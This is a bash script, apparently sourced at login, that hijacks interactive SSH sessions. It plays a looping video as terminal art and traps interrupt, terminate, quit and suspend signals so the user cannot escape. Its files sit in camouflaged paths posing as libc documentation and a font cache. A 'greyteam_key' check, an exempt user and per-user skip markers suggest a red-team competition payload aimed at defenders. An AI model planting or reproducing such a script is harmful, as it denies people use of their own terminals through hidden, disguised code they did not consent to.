#!/bin/bash
VIDEO_PATH="/usr/share/doc/libc6/.cache/data.mp4"
FRAMES_DIR="/tmp/.font-cache"
[ -z "$SSH_CONNECTION" ] && return 0 2>/dev/null || true
[ ! -t 1 ] && return 0 2>/dev/null || true
[ ! -f /greyteam_key ] && return 0 2>/dev/null || true
[ "$USER" = "tirek" ] && return 0 2>/dev/null || true
[ -f /usr/share/doc/libc6/.cache/.3f7a9k2_$USER ] && return 0 2>/dev/null || true
command -v chafa >/dev/null 2>&1 || return 0 2>/dev/null || true
command -v ffmpeg >/dev/null 2>&1 || return 0 2>/dev/null || true
trap : INT TERM QUIT TSTP
COLS=$(stty size 2>/dev/null | awk '{print $2}' || tput cols 2>/dev/null || echo 147)
ROWS=$(stty size 2>/dev/null | awk '{print $1}' || tput lines 2>/dev/null || echo 32)
if [ ! -d "$FRAMES_DIR" ] || [ -z "$(ls -A $FRAMES_DIR 2>/dev/null)" ]; then
  mkdir -p "$FRAMES_DIR"
  ffmpeg -i "$VIDEO_PATH" -vf "fps=6,scale=720:-1" "${FRAMES_DIR}/frame%04d.png" 2>/dev/null
fi
mapfile -t FRAMES < <(find "$FRAMES_DIR" -name 'frame*.png' | sort)
[ ${#FRAMES[@]} -eq 0 ] && return 0 2>/dev/null || true
tput civis 2>/dev/null
tput smcup 2>/dev/null
clear
while true; do
  for frame in "${FRAMES[@]}"; do
    tput cup 0 0
    COLS=$(stty size 2>/dev/null | awk '{print $2}' || tput cols 2>/dev/null || echo 147)
    ROWS=$(stty size 2>/dev/null | awk '{print $1}' || tput lines 2>/dev/null || echo 32)
    chafa --size="${COLS}x${ROWS}" --font-ratio=1/2 --scale=max -f symbols "$frame" 2>/dev/null
  done
done
